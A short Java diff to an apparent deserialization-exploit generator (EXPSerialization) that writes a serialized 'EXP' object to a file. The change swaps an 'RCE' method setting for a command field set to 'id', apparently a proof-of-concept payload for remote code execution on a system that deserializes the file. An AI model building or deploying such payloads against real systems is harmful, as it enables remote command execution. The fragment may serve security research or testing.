@@ -13,8 +13,7 @@ public class EXPSerialization {
 
     public static void Serialize(String targetname) throws IOException {
         EXP exp = new EXP();
-        exp.setMethod("RCE");
-        exp.setTarget("pi");
+        exp.setCommand("id");
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File(targetname)));
         oos.writeObject(exp);
         oos.close();
